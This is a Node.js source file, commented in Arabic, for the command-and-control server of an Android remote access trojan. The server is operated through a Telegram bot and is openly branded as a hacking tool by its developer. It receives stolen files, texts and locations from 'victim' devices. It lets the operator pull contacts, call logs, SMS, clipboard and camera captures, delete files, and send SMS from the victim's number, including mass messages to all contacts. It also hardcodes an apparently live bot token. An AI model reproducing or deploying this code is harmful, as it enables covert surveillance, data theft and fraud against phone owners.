const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");
const CryptoJS = require('crypto-js');

// إعدادات البوت - يجب تغيير هذه البيانات
const token = '8134815503:AAEtuq0lifjlISzsJFg206KkE00wrOd6b-8'
const id = '6565594143'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

let currentNumber = '';
let currentUuid = '';
let currentTitle = '';

// إعدادات middleware
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameterLimit: 50000
}));

const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: 50 * 1024 * 1024 // 50 ميجابايت
    }
});

// Routes
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : الهاكر الغامض شخصيا معرف المطور @VIP_MFM</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        const name = req.file.originalname
        const model = req.headers.model || 'غير معروف'
        
        appBot.sendDocument(id, req.file.buffer, {
                caption: `°• رسالة من <b>${model}</b> جهاز`,
                parse_mode: "HTML"
            },
            {
                filename: name,
                contentType: req.file.mimetype,
            })
        res.json({status: 'success', message: 'تم الرفع بنجاح'})
    } catch (error) {
        res.status(500).json({status: 'error', message: 'خطأ في الرفع'})
    }
})

app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'غير معروف'
        const text = req.body.text || 'لا يوجد نص'
        
        appBot.sendMessage(id, `°• رسالة من <b>${model}</b> جهاز\n\n${text}`, {parse_mode: "HTML"})
        res.json({status: 'success', message: 'تم الارسال بنجاح'})
    } catch (error) {
        res.status(500).json({status: 'error', message: 'خطأ في الارسال'})
    }
})

app.post("/uploadLocation", (req, res) => {
    try {
        const model = req.headers.model || 'غير معروف'
        const lat = parseFloat(req.body.lat)
        const lon = parseFloat(req.body.lon)
        
        if (isNaN(lat) || isNaN(lon)) {
            return res.status(400).json({status: 'error', message: 'إحداثيات غير صالحة'})
        }
        
        appBot.sendLocation(id, lat, lon)
        appBot.sendMessage(id, `°• موقع من <b>${model}</b> جهاز`, {parse_mode: "HTML"})
        res.json({status: 'success', message: 'تم ارسال الموقع بنجاح'})
    } catch (error) {
        res.status(500).json({status: 'error', message: 'خطأ في ارسال الموقع'})
    }
})

// WebSocket Connection
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model || 'غير معروف'
    const battery = req.headers.battery || 'غير معروف'
    const version = req.headers.version || 'غير معروف'
    const brightness = req.headers.brightness || 'غير معروف'
    const provider = req.headers.provider || 'غير معروف'

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    
    console.log(`جهاز متصل: ${model} - UUID: ${uuid}`)
    
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• نظام الاندرويد : <b>${version}</b>\n` +
        `• سطوح الشاشة : <b>${brightness}</b>\n` +
        `• مزود : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    
    ws.on('close', function () {
        console.log(`جهاز منفصل: ${model} - UUID: ${uuid}`)
        appBot.sendMessage(id,
            `°• تم فصل الجهاز\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(uuid)
    })

    ws.on('message', function (data) {
        console.log('رسالة من الجهاز:', data.toString())
    })

    ws.on('error', function (error) {
        console.log('خطأ في الاتصال:', error)
    })
})

// Telegram Bot Handlers
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    const text = message.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        appBot.sendMessage(chatId, '°• ليس لديك صلاحية استخدام هذا البوت')
        return;
    }

    if (message.reply_to_message) {
        handleReplyMessages(message);
    } else {
        handleDirectMessages(message);
    }
});

function handleReplyMessages(message) {
    const replyText = message.reply_to_message.text;
    const userText = message.text;
    
    if (replyText.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
        currentNumber = userText;
        appBot.sendMessage(id,
            '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        );
    }
    else if (replyText.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.readyState === ws.OPEN && ws.uuid === currentUuid) {
                ws.send(`send_message:${currentNumber}/${userText}`);
            }
        });
        currentNumber = '';
        currentUuid = '';
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهكر الغامض شخصيا 😴 معرف المطور @VIP_MFM ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة"], 
                        ["تنفيذ الامر"],
                        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
                        ["📢 قناة التليجرام"]
                    ],
                    'resize_keyboard': true
                }
            }
        );
    }
    // يمكن إضافة المزيد من الشروط هنا
}

function handleDirectMessages(message) {
    const text = message.text;
    const chatId = message.chat.id;
    
    if (text === '/start' || text === '/start') {
        sendWelcomeMessage(message);
    } else if (text === 'الاجهزة المتصلة') {
        listConnectedDevices(message);
    } else if (text === 'تنفيذ الامر') {
        executeCommand(message);
    } else if (text === '💬 واتساب المطور') {
        appBot.sendMessage(chatId, 'https://wa.me/967776080513');
    } else if (text === '📺 قناة اليوتيوب') {
        appBot.sendMessage(chatId, 'https://youtube.com/@user-afe?si=_A-z5jZhPHM44d43');
    } else if (text === '📢 قناة التليجرام') {
        appBot.sendMessage(chatId, 'https://t.me/muh_739');
    }
}

function sendWelcomeMessage(message) {
    appBot.sendMessage(id,
        `°• مرحبًا بكم في بوت الاختراق مطور البوت الهكر الغامض شخصيا 😴 معرف المطور @VIP_MFM\n\n` +
        `• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n` +
        `• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجهاز لاستلام الأمر\n\n` +
        `• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n` +
        `• إذا علقت في مكان ما في الروبوت ، أرسل /start الأمر ،`,
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [
                    ["الاجهزة المتصلة"], 
                    ["تنفيذ الامر"],
                    ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
                    ["📢 قناة التليجرام"]
                ],
                'resize_keyboard': true
            }
        }
    );
}

function listConnectedDevices(message) {
    if (appClients.size === 0) {
        appBot.sendMessage(id,
            '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
        );
    } else {
        let text = '°• قائمة الاجهزة المتصلة :\n\n';
        appClients.forEach(function (value, key) {
            text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                `• البطارية : <b>${value.battery}</b>\n` +
                `• نظام الاندرويد : <b>${value.version}</b>\n` +
                `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                `• مزود : <b>${value.provider}</b>\n\n`;
        });
        appBot.sendMessage(id, text, {parse_mode: "HTML"});
    }
}

function executeCommand(message) {
    if (appClients.size === 0) {
        appBot.sendMessage(id,
            '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
        );
    } else {
        const deviceListKeyboard = [];
        appClients.forEach(function (value, key) {
            deviceListKeyboard.push([{
                text: value.model,
                callback_data: 'device:' + key
            }]);
        });
        appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
            "reply_markup": {
                "inline_keyboard": deviceListKeyboard,
            },
        });
    }
}

// Callback Query Handler
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    if (command === 'device') {
        showDeviceCommands(msg, uuid);
    } else {
        // معالجة الأوامر الأخرى
        handleDeviceCommand(msg, command, uuid);
    }
});

function showDeviceCommands(msg, uuid) {
    const deviceInfo = appClients.get(uuid);
    if (!deviceInfo) {
        appBot.sendMessage(id, '°• الجهاز لم يعد متصلاً');
        return;
    }
    
    appBot.editMessageText(`°• حدد الأمر للجهاز : <b>${deviceInfo.model}</b>`, {
        chat_id: id,
        message_id: msg.message_id,
        reply_markup: {
            inline_keyboard: [
                [
                    {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
                    {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
                ],
                [
                    {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
                    {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
                ],
                [
                    {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
                    {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
                ],
                [
                    {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                    {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                ],
                [
                    {text: '🚩الموقع', callback_data: `location:${uuid}`},
                    {text: '👹نخب', callback_data: `toast:${uuid}`}
                ],
                [
                    {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
                    {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
                ],
                [
                    {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
                    {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
                ],
                [
                    {text: 'الرسايل', callback_data: `messages:${uuid}`},
                    {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
                ],
                [
                    {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                    {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                ],
                [
                    {
                        text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
                        callback_data: `send_message_to_all:${uuid}`
                    }
                ],
            ]
        },
        parse_mode: "HTML"
    });
}

function handleDeviceCommand(msg, command, uuid) {
    appBot.deleteMessage(id, msg.message_id);
    
    switch(command) {
        case 'send_message':
            appBot.sendMessage(id, 
                '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
                '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
                {reply_markup: {force_reply: true}}
            );
            currentUuid = uuid;
            break;
            
        case 'calls':
        case 'contacts':
        case 'messages':
        case 'apps':
        case 'device_info':
        case 'clipboard':
        case 'camera_main':
        case 'camera_selfie':
        case 'location':
        case 'vibrate':
        case 'stop_audio':
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === ws.OPEN && ws.uuid === uuid) {
                    ws.send(command);
                }
            });
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهكر الغامض شخصيا 😴 معرف المطور @VIP_MFM ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة"], 
                            ["تنفيذ الامر"],
                            ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
                            ["📢 قناة التليجرام"]
                        ],
                        'resize_keyboard': true
                    }
                }
            );
            break;
            
        default:
            appBot.sendMessage(id, '°• الأمر غير معروف');
    }
}

// Ping clients periodically
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === ws.OPEN) {
            ws.send('ping');
        }
    });
    
    // Keep the server alive
    try {
        axios.get(address).catch(() => {});
    } catch (e) {
        console.log('Ping error:', e.message);
    }
}, 30000); // كل 30 ثانية

// Start server
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🤖 Bot is ready and polling...`);
});

// Handle graceful shutdown
process.on('SIGTERM', () => {
    console.log('Received SIGTERM, shutting down gracefully');
    appServer.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});